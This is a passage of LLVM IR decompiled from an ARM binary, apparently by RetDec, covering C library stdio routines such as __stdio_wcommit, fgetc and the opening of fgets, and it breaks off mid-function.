  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_175f8, { 1, 0 }
  uselistorder label %dec_label_pc_175e4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1757c, { 1, 0 }
  uselistorder label %dec_label_pc_17558, { 1, 0 }
  uselistorder label %dec_label_pc_17538, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17628 = load i32, i32* @r4, align 4
  store i32 %v3_17628, i32* %stack_var_-8, align 4
  %v1_1762c = add i32 %arg1, 8
  %v2_1762c = inttoptr i32 %v1_1762c to i32*
  %v3_1762c = load i32, i32* %v2_1762c, align 4
  store i32 %v3_1762c, i32* @r1, align 4
  %v1_17630 = add i32 %arg1, 16
  %v2_17630 = inttoptr i32 %v1_17630 to i32*
  %v3_17630 = load i32, i32* %v2_17630, align 4
  %v9_17634 = icmp eq i32 %v3_17630, %v3_1762c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_17634, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1762c, i32* %v2_17630, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_17640 = xor i1 %v9_17634, true
  call void @__pseudo_cond_branch(i1 %v1_17640, i32 ptrtoint (i32* @global_var_19018.644 to i32))
  %v0_17644 = load i32, i32* %r4.global-to-local, align 4
  %v1_17644 = add i32 %v0_17644, 8
  %v2_17644 = inttoptr i32 %v1_17644 to i32*
  %v3_17644 = load i32, i32* %v2_17644, align 4
  %v1_17648 = add i32 %v0_17644, 16
  %v2_17648 = inttoptr i32 %v1_17648 to i32*
  %v3_17648 = load i32, i32* %v2_17648, align 4
  %v2_1764c = sub i32 %v3_17648, %v3_17644
  %v2_17650 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17650, i32* @r4, align 4
  ret i32 %v2_1764c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_17658 = load i32, i32* @r4, align 4
  store i32 %v3_17658, i32* %stack_var_-20, align 4
  %v6_17658 = load i32, i32* @r5, align 4
  %v9_17658 = load i32, i32* @r6, align 4
  %v12_17658 = load i32, i32* @r7, align 4
  %v15_17658 = load i32, i32* @lr, align 4
  %v1_1765c = add i32 %arg1, 52
  %v2_1765c = inttoptr i32 %v1_1765c to i32*
  %v3_1765c = load i32, i32* %v2_1765c, align 4
  store i32 %v3_1765c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17660 = icmp eq i32 %v3_1765c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_17660, label %dec_label_pc_17694, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %entry
  %v1_17670 = add i32 %arg1, 16
  %v2_17670 = inttoptr i32 %v1_17670 to i32*
  %v3_17670 = load i32, i32* %v2_17670, align 4
  store i32 %v3_17670, i32* %r2.global-to-local, align 4
  %v1_17674 = add i32 %arg1, 24
  %v2_17674 = inttoptr i32 %v1_17674 to i32*
  %v3_17674 = load i32, i32* %v2_17674, align 4
  store i32 %v3_17674, i32* %r3.global-to-local, align 4
  %v3_17678 = icmp uge i32 %v3_17670, %v3_17674
  store i1 %v3_17678, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_17678, label %dec_label_pc_17688, label %.thread

.thread:                                          ; preds = %dec_label_pc_17670
  %v2_1767c = inttoptr i32 %v3_17670 to i8*
  %v3_1767c = load i8, i8* %v2_1767c, align 1
  %v4_1767c = zext i8 %v3_1767c to i32
  store i32 %v4_1767c, i32* %r5.global-to-local, align 4
  %v6_1767c = add i32 %v3_17670, 1
  store i32 %v6_1767c, i32* %r2.global-to-local, align 4
  store i32 %v6_1767c, i32* %v2_17670, align 4
  br label %dec_label_pc_1778c

dec_label_pc_17688:                               ; preds = %dec_label_pc_17670
  %v1_17688 = inttoptr i32 %arg1 to i16*
  %v2_17688 = call i32 @getc_unlocked(i16* %v1_17688)
  store i32 %v2_17688, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1778c

dec_label_pc_17694:                               ; preds = %entry
  %v0_17694 = call i32 @__aeabi_read_tp()
  %v0_17698 = load i32, i32* @r7, align 4
  %v1_17698 = add i32 %v0_17698, 64
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  %v3_17698 = load i32, i32* %v2_17698, align 4
  store i32 %v3_17698, i32* %r3.global-to-local, align 4
  %v1_1769c = add i32 %v0_17694, -1168
  store i32 %v1_1769c, i32* @r6, align 4
  %v3_176a0 = icmp uge i32 %v3_17698, %v1_1769c
  store i1 %v3_176a0, i1* %cpsr_c.global-to-local, align 1
  %v9_176a0 = icmp eq i32 %v3_17698, %v1_1769c
  br i1 %v9_176a0, label %dec_label_pc_176e8, label %dec_label_pc_176a8

dec_label_pc_176a8:                               ; preds = %dec_label_pc_17694
  %v1_176a8 = add i32 %v0_17698, 56
  store i32 %v1_176a8, i32* @r5, align 4
  store i32 %v1_176a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176c0.dec_label_pc_176b4_crit_edge, %dec_label_pc_176a8
  %v0_176b4 = phi i32 [ %v0_176b4.pre, %dec_label_pc_176c0.dec_label_pc_176b4_crit_edge ], [ %v1_176a8, %dec_label_pc_176a8 ]
  %v1_176b4 = inttoptr i32 %v0_176b4 to i32*
  %v2_176b4 = load i32, i32* %v1_176b4, align 4
  store i32 %v2_176b4, i32* %r3.global-to-local, align 4
  %v1_176b8 = load i32, i32* @r4, align 4
  %v3_176b8 = icmp uge i32 %v2_176b4, %v1_176b8
  store i1 %v3_176b8, i1* %cpsr_c.global-to-local, align 1
  %v9_176b8 = icmp eq i32 %v2_176b4, %v1_176b8
  br i1 %v9_176b8, label %dec_label_pc_176c0, label %dec_label_pc_176d8

dec_label_pc_176c0:                               ; preds = %dec_label_pc_176b4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_176d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_176d0, label %dec_label_pc_176d4, label %dec_label_pc_176c0.dec_label_pc_176b4_crit_edge

dec_label_pc_176c0.dec_label_pc_176b4_crit_edge:  ; preds = %dec_label_pc_176c0
  %v0_176b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176c0
  %v0_176d4 = load i32, i32* @r4, align 4
  store i32 %v0_176d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176d8

dec_label_pc_176d8:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_176d4
  %v0_176d8 = phi i32 [ %v0_176d4, %dec_label_pc_176d4 ], [ %v2_176b4, %dec_label_pc_176b4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_176d8 = icmp eq i32 %v0_176d8, 0
  br i1 %v2_176d8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_176d8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_176d8, %bb
  store i32 95972, i32* @lr, align 4
  %v1_176e0 = xor i1 %v2_176d8, true
  call void @__pseudo_cond_branch(i1 %v1_176e0, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_176e4 = load i32, i32* @r6, align 4
  %v1_176e4 = load i32, i32* @r7, align 4
  %v2_176e4 = add i32 %v1_176e4, 64
  %v3_176e4 = inttoptr i32 %v2_176e4 to i32*
  store i32 %v0_176e4, i32* %v3_176e4, align 4
  %v0_176e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_17694, %bb18
  %v1_176f8 = phi i32 [ %v0_17698, %dec_label_pc_17694 ], [ %v0_176e8.pre, %bb18 ]
  %v1_176e8 = add i32 %v1_176f8, 60
  %v2_176e8 = inttoptr i32 %v1_176e8 to i32*
  %v3_176e8 = load i32, i32* %v2_176e8, align 4
  store i32 %v3_176e8, i32* %r2.global-to-local, align 4
  %v1_176ec = add i32 %v1_176f8, 16
  %v2_176ec = inttoptr i32 %v1_176ec to i32*
  %v3_176ec = load i32, i32* %v2_176ec, align 4
  store i32 %v3_176ec, i32* @r1, align 4
  %v1_176f0 = add i32 %v1_176f8, 24
  %v2_176f0 = inttoptr i32 %v1_176f0 to i32*
  %v3_176f0 = load i32, i32* %v2_176f0, align 4
  store i32 %v3_176f0, i32* %r3.global-to-local, align 4
  %v1_176f4 = add i32 %v3_176e8, 1
  store i32 %v1_176f4, i32* %r2.global-to-local, align 4
  store i32 %v1_176f4, i32* %v2_176e8, align 4
  %v0_176fc = load i32, i32* @r1, align 4
  %v1_176fc = load i32, i32* %r3.global-to-local, align 4
  %v3_176fc = icmp uge i32 %v0_176fc, %v1_176fc
  store i1 %v3_176fc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_176fc, label %dec_label_pc_1770c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_176e8
  %v2_17700 = inttoptr i32 %v0_176fc to i8*
  %v3_17700 = load i8, i8* %v2_17700, align 1
  %v4_17700 = zext i8 %v3_17700 to i32
  store i32 %v4_17700, i32* %r5.global-to-local, align 4
  %v6_17700 = add i32 %v0_176fc, 1
  store i32 %v6_17700, i32* @r1, align 4
  %v2_17704 = load i32, i32* @r7, align 4
  %v3_17704 = add i32 %v2_17704, 16
  %v4_17704 = inttoptr i32 %v3_17704 to i32*
  store i32 %v6_17700, i32* %v4_17704, align 4
  br label %dec_label_pc_17718

dec_label_pc_1770c:                               ; preds = %dec_label_pc_176e8
  %v0_1770c = load i32, i32* @r7, align 4
  %v1_17710 = inttoptr i32 %v0_1770c to i16*
  %v2_17710 = call i32 @getc_unlocked(i16* %v1_17710)
  store i32 %v2_17710, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17718

dec_label_pc_17718:                               ; preds = %.thread2, %dec_label_pc_1770c
  %v0_17718 = load i32, i32* @r7, align 4
  %v1_17718 = add i32 %v0_17718, 60
  %v2_17718 = inttoptr i32 %v1_17718 to i32*
  %v3_17718 = load i32, i32* %v2_17718, align 4
  %v1_1771c = add i32 %v3_17718, -1
  store i32 %v1_1771c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17720 = icmp eq i32 %v1_1771c, 0
  store i32 %v1_1771c, i32* %v2_17718, align 4
  br i1 %v2_17720, label %dec_label_pc_1772c, label %dec_label_pc_1778c

dec_label_pc_1772c:                               ; preds = %dec_label_pc_17718
  %v0_1772c = load i32, i32* %r3.global-to-local, align 4
  %v1_1772c = load i32, i32* @r7, align 4
  %v2_1772c = add i32 %v1_1772c, 64
  %v3_1772c = inttoptr i32 %v2_1772c to i32*
  store i32 %v0_1772c, i32* %v3_1772c, align 4
  %v0_17730 = load i32, i32* @r7, align 4
  %v1_17730 = add i32 %v0_17730, 56
  store i32 %v1_17730, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17734

dec_label_pc_17734:                               ; preds = %dec_label_pc_17764.dec_label_pc_17734_crit_edge, %dec_label_pc_1772c
  %v0_1773c = phi i32 [ %v0_1773c.pre, %dec_label_pc_17764.dec_label_pc_17734_crit_edge ], [ %v1_17730, %dec_label_pc_1772c ]
  %v0_17734 = phi i32 [ %v0_17734.pre, %dec_label_pc_17764.dec_label_pc_17734_crit_edge ], [ %v0_17730, %dec_label_pc_1772c ]
  %v1_17734 = add i32 %v0_17734, 56
  %v2_17734 = inttoptr i32 %v1_17734 to i32*
  %v3_17734 = load i32, i32* %v2_17734, align 4
  store i32 %v3_17734, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1773c, i32* %r2.global-to-local, align 4
  %v1_1774022 = inttoptr i32 %v0_1773c to i32*
  %v2_1774023 = load i32, i32* %v1_1774022, align 4
  store i32 %v2_1774023, i32* %r3.global-to-local, align 4
  %v3_1774425 = icmp uge i32 %v2_1774023, %v3_17734
  store i1 %v3_1774425, i1* %cpsr_c.global-to-local, align 1
  %v9_1774431 = icmp eq i32 %v2_1774023, %v3_17734
  br i1 %v9_1774431, label %dec_label_pc_1774c, label %dec_label_pc_17764

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17734, %dec_label_pc_1774c.dec_label_pc_17740_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1775c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1775c, label %dec_label_pc_17760, label %dec_label_pc_1774c.dec_label_pc_17740_crit_edge

dec_label_pc_1774c.dec_label_pc_17740_crit_edge:  ; preds = %dec_label_pc_1774c
  %v0_17740.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17744.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17740 = inttoptr i32 %v0_17740.pre to i32*
  %v2_17740 = load i32, i32* %v1_17740, align 4
  store i32 %v2_17740, i32* %r3.global-to-local, align 4
  %v3_17744 = icmp uge i32 %v2_17740, %v1_17744.pre
  store i1 %v3_17744, i1* %cpsr_c.global-to-local, align 1
  %v9_17744 = icmp eq i32 %v2_17740, %v1_17744.pre
  br i1 %v9_17744, label %dec_label_pc_1774c, label %dec_label_pc_17764

dec_label_pc_17760:                               ; preds = %dec_label_pc_1774c
  %v0_17760 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17760, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %dec_label_pc_17734, %dec_label_pc_1774c.dec_label_pc_17740_crit_edge, %dec_label_pc_17760
  %v0_1776c = phi i32 [ %v0_17760, %dec_label_pc_17760 ], [ %v2_1774023, %dec_label_pc_17734 ], [ %v2_17740, %dec_label_pc_1774c.dec_label_pc_17740_crit_edge ]
  %v1_17764 = phi i32 [ %v0_17760, %dec_label_pc_17760 ], [ %v3_17734, %dec_label_pc_17734 ], [ %v1_17744.pre, %dec_label_pc_1774c.dec_label_pc_17740_crit_edge ]
  %v3_17764 = icmp uge i32 %v0_1776c, %v1_17764
  store i1 %v3_17764, i1* %cpsr_c.global-to-local, align 1
  %v9_17764 = icmp eq i32 %v0_1776c, %v1_17764
  br i1 %v9_17764, label %dec_label_pc_1776c, label %dec_label_pc_17764.dec_label_pc_17734_crit_edge

dec_label_pc_17764.dec_label_pc_17734_crit_edge:  ; preds = %dec_label_pc_17764
  %v0_17734.pre = load i32, i32* @r7, align 4
  %v0_1773c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17734

dec_label_pc_1776c:                               ; preds = %dec_label_pc_17764
  %v2_1776c = icmp ne i32 %v1_17764, 0
  store i1 %v2_1776c, i1* %cpsr_c.global-to-local, align 1
  %v7_17770 = icmp slt i32 %v1_17764, 2
  br i1 %v7_17770, label %dec_label_pc_1778c, label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %dec_label_pc_1776c
  %v0_17778 = load i32, i32* @r1, align 4
  %v1_17778 = add i32 %v0_17778, 129
  store i32 %v1_17778, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1778c

dec_label_pc_1778c:                               ; preds = %.thread, %dec_label_pc_17718, %dec_label_pc_17774, %dec_label_pc_1776c, %dec_label_pc_17688
  %v0_1778c = load i32, i32* %r5.global-to-local, align 4
  %v2_17794 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17794, i32* @r4, align 4
  store i32 %v6_17658, i32* @r5, align 4
  store i32 %v9_17658, i32* @r6, align 4
  store i32 %v12_17658, i32* @r7, align 4
  store i32 %v15_17658, i32* @lr, align 4
  ret i32 %v0_1778c

; uselistorder directives
  uselistorder i32 %v0_17760, { 1, 0, 2 }
  uselistorder i32 %v1_17744.pre, { 0, 2, 1 }
  uselistorder i32 %v0_176fc, { 1, 0, 2 }
  uselistorder i32 %v1_176f8, { 0, 2, 1 }
  uselistorder i32 %v1_176b8, { 1, 0 }
  uselistorder i32 %v3_17670, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_1778c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_17764, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1774c, { 1, 0 }
  uselistorder label %dec_label_pc_17718, { 1, 0 }
  uselistorder label %dec_label_pc_176e8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_176d8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1779c = load i32, i32* @r4, align 4
  store i32 %v3_1779c, i32* %stack_var_-32, align 4
  %v6_1779c = load i32, i32* @r5, align 4
  %v9_1779c = load i32, i32* @r6, align 4
  %v12_1779c = load i32, i32* @r7, align 4
  %v15_1779c = load i32, i32* @r8, align 4
  %v24_1779c = load i32, i32* @lr, align 4
  %v1_177a0 = add i32 %arg3, 52
  %v2_177a0 = inttoptr i32 %v1_177a0 to i32*
  %v3_177a0 = load i32, i32* %v2_177a0, align 4
  store i32 %v3_177a0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_177a4 = icmp eq i32 %v3_177a0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_177a4, label %dec_label_pc_177b8, label %dec_label_pc_1781c

dec_label_pc_177b8:                               ; preds = %entry
  %v0_177b8 = call i32 @__aeabi_read_tp()
  %v1_177bc = add i32 %arg3, 64
  %v2_177bc = inttoptr i32 %v1_177bc to i32*
  %v3_177bc = load i32, i32* %v2_177bc, align 4
  store i32 %v3_177bc, i32* %r3.global-to-local, align 4
  %v1_177c0 = add i32 %v0_177b8, -1168
  store i32 %v1_177c0, i32* @r8, align 4
  %v3_177c4 = icmp uge i32 %v3_177bc, %v1_177c0
  store i1 %v3_177c4, i1* %cpsr_c.global-to-local, align 1
  %v9_177c4 = icmp eq i32 %v3_177bc, %v1_177c0
  br i1 %v9_177c4, label %dec_label_pc_17810, label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177b8
  %v1_177cc = add i32 %arg3, 56
  store i32 %v1_177cc, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_177cc, i32* %r2.global-to-local, align 4
  %v0_177d8 = load i32, i32* @r6, align 4
  store i32 %v0_177d8, i32* @r4, align 4
  %v1_177dc36 = inttoptr i32 %v1_177cc to i32*
  %v2_177dc37 = load i32, i32* %v1_177dc36, align 4
  store i32 %v2_177dc37, i32* %r3.global-to-local, align 4
  %v3_177e039 = icmp uge i32 %v2_177dc37, %v0_177d8
  store i1 %v3_177e039, i1* %cpsr_c.global-to-local, align 1
  %v9_177e045 = icmp eq i32 %v2_177dc37, %v0_177d8
  br i1 %v9_177e045, label %dec_label_pc_177e8, label %dec_label_pc_17800

dec_label_pc_177e8:                               ; preds = %dec_label_pc_177cc, %dec_label_pc_177e8.dec_label_pc_177dc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_177f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_177f8, label %dec_label_pc_177fc, label %dec_label_pc_177e8.dec_label_pc_177dc_crit_edge

dec_label_pc_177e8.dec_label_pc_177dc_crit_edge:  ; preds = %dec_label_pc_177e8
  %v0_177dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_177e0.pre = load i32, i32* @r4, align 4
  %v1_177dc = inttoptr i32 %v0_177dc.pre to i32*
  %v2_177dc = load i32, i32* %v1_177dc, align 4
  store i32 %v2_177dc, i32* %r3.global-to-local, align 4
  %v3_177e0 = icmp uge i32 %v2_177dc, %v1_177e0.pre
  store i1 %v3_177e0, i1* %cpsr_c.global-to-local, align 1
  %v9_177e0 = icmp eq i32 %v2_177dc, %v1_177e0.pre
  br i1 %v9_177e0, label %dec_label_pc_177e8, label %dec_label_pc_17800

dec_label_pc_177fc:                               ; preds = %dec_label_pc_177e8
  %v0_177fc = load i32, i32* @r4, align 4
  store i32 %v0_177fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17800

dec_label_pc_17800:                               ; preds = %dec_label_pc_177cc, %dec_label_pc_177e8.dec_label_pc_177dc_crit_edge, %dec_label_pc_177fc
  %v0_17800 = phi i32 [ %v0_177fc, %dec_label_pc_177fc ], [ %v2_177dc37, %dec_label_pc_177cc ], [ %v2_177dc, %dec_label_pc_177e8.dec_label_pc_177dc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17800 = icmp eq i32 %v0_17800, 0
  br i1 %v2_17800, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_17800
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17800, %bb
  store i32 96268, i32* @lr, align 4
  %v1_17808 = xor i1 %v2_17800, true
  call void @__pseudo_cond_branch(i1 %v1_17808, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_1780c = load i32, i32* @r8, align 4
  %v1_1780c = load i32, i32* @r7, align 4
  %v2_1780c = add i32 %v1_1780c, 64
  %v3_1780c = inttoptr i32 %v2_1780c to i32*
  store i32 %v0_1780c, i32* %v3_1780c, align 4
  br label %dec_label_pc_17810

dec_label_pc_17810:                               ; preds = %dec_label_pc_177b8, %bb20
  %v0_17810 = load i32, i32* @r7, align 4
  %v1_17810 = add i32 %v0_17810, 60
  %v2_17810 = inttoptr i32 %v1_17810 to i32*
  %v3_17810 = load i32, i32* %v2_17810, align 4
  %v1_17814 = add i32 %v3_17810, 1
  store i32 %v1_17814, i32* %r3.global-to-local, align 4
  store i32 %v1_17814, i32* %v2_17810, align 4
  %v0_1781c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17820.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_17824.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1781c

dec_label_pc_1781c:                               ; preds = %entry, %dec_label_pc_17810
  %v0_17824 = phi i32 [ %arg3, %entry ], [ %v0_17824.pre, %dec_label_pc_17810 ]
  %v0_17820 = phi i32 [ %arg2, %entry ], [ %v0_17820.pre, %dec_label_pc_17810 ]
  %v0_1781c = phi i32 [ %arg1, %entry ], [ %v0_1781c.pre, %dec_label_pc_17810 ]
  store i32 %v0_17820, i32* %r1.global-to-local, align 4
  store i32 %v0_17824, i32* %r2.global-to-local, align 4
  %v3_17828 = inttoptr i32 %v0_1781c to i8*
  %v4_17828 = call i32 @__GI_fgets_unlocked(i8* %v3_17828, i32 %v0_17820, i32 %v0_17824)
  %v0_1782c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1782c = icmp eq i32 %v0_1782c, 0
  store i32 %v4_17828, i32* %r8.global-to-local, align 4
  br i1 %v2_1782c, label %dec_label_pc_17838, label %dec_label_pc_178ac

dec_label_pc_17838:                               ; preds = %dec_label_pc_1781c
  %v0_17838 = load i32, i32* @r7, align 4
  %v1_17838 = add i32 %v0_17838, 60
  %v2_17838 = inttoptr i32 %v1_17838 to i32*
  %v3_17838 = load i32, i32* %v2_17838, align 4
  %v1_1783c = add i32 %v3_17838, -1
  store i32 %v1_1783c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17840 = icmp eq i32 %v1_1783c, 0
  store i32 %v1_1783c, i32* %v2_17838, align 4
  br i1 %v2_17840, label %dec_label_pc_1784c, label %dec_label_pc_178ac

dec_label_pc_1784c:                               ; preds = %dec_label_pc_17838
  %v0_1784c = load i32, i32* %r3.global-to-local, align 4
  %v1_1784c = load i32, i32* @r7, align 4
  %v2_1784c = add i32 %v1_1784c, 64
  %v3_1784c = inttoptr i32 %v2_1784c to i32*
  store i32 %v0_1784c, i32* %v3_1784c, align 4
  %v0_17850 = load i32, i32* @r7, align 4
  %v1_17850 = add i32 %v0_17850, 56
  store i32 %v1_17850, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %dec_label_pc_17884.dec_label_pc_17854_crit_edge, %dec_label_pc_1784c
  %v0_1785c = phi i32 [ %v0_1785c.pre, %dec_label_pc_17884.dec_label_pc_17854_crit_edge ], [ %v1_17850, %dec_label_pc_1784c ]
  %v0_17854 = phi i32 [ %v0_17854.pre, %dec_label_pc_17884.dec_label_pc_17854_crit_edge ], [ %v0_17850, %dec_label_pc_1784c ]
  %v1_17854 = add i32 %v0_17854, 56
  %v2_17854 = inttoptr i32 %v1_17854 to i32*
  %v3_17854 = load i32, i32* %v2_17854, align 4
  store i32 %v3_17854, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1785c, i32* %r2.global-to-local, align 4
  %v1_1786024 = inttoptr i32 %v0_1785c to i32*
  %v2_1786025 = load i32, i32* %v1_1786024, align 4
  store i32 %v2_1786025, i32* %r3.global-to-local, align 4
  %v3_1786427 = icmp uge i32 %v2_1786025, %v3_17854
  store i1 %v3_1786427, i1* %cpsr_c.global-to-local, align 1
  %v9_1786433 = icmp eq i32 %v2_1786025, %v3_17854
  br i1 %v9_1786433, label %dec_label_pc_1786c, label %dec_label_pc_17884

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17854, %dec_label_pc_1786c.dec_label_pc_17860_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1787c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1787c, label %dec_label_pc_17880, label %dec_label_pc_1786c.dec_label_pc_17860_crit_edge

dec_label_pc_1786c.dec_label_pc_17860_crit_edge:  ; preds = %dec_label_pc_1786c
  %v0_17860.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17864.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17860 = inttoptr i32 %v0_17860.pre to i32*
  %v2_17860 = load i32, i32* %v1_17860, align 4
  store i32 %v2_17860, i32* %r3.global-to-local, align 4
  %v3_17864 = icmp uge i32 %v2_17860, %v1_17864.pre
  store i1 %v3_17864, i1* %cpsr_c.global-to-local, align 1
  %v9_17864 = icmp eq i32 %v2_17860, %v1_17864.pre
  br i1 %v9_17864, label %dec_label_pc_1786c, label %dec_label_pc_17884

dec_label_pc_17880:                               ; preds = %dec_label_pc_1786c
  %v0_17880 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17880, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17884

dec_label_pc_17884:                               ; preds = %dec_label_pc_17854, %dec_label_pc_1786c.dec_label_pc_17860_crit_edge, %dec_label_pc_17880
  %v0_1788c = phi i32 [ %v0_17880, %dec_label_pc_17880 ], [ %v2_1786025, %dec_label_pc_17854 ], [ %v2_17860, %dec_label_pc_1786c.dec_label_pc_17860_crit_edge ]
  %v1_17884 = phi i32 [ %v0_17880, %dec_label_pc_17880 ], [ %v3_17854, %dec_label_pc_17854 ], [ %v1_17864.pre, %dec_label_pc_1786c.dec_label_pc_17860_crit_edge ]
  %v3_17884 = icmp uge i32 %v0_1788c, %v1_17884
  store i1 %v3_17884, i1* %cpsr_c.global-to-local, align 1
  %v9_17884 = icmp eq i32 %v0_1788c, %v1_17884
  br i1 %v9_17884, label %dec_label_pc_1788c, label %dec_label_pc_17884.dec_label_pc_17854_crit_edge

dec_label_pc_17884.dec_label_pc_17854_crit_edge:  ; preds = %dec_label_pc_17884
  %v0_17854.pre = load i32, i32* @r7, align 4
  %v0_1785c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17854

dec_label_pc_1788c:                               ; preds = %dec_label_pc_17884
  %v2_1788c = icmp ne i32 %v1_17884, 0
  store i1 %v2_1788c, i1* %cpsr_c.global-to-local, align 1
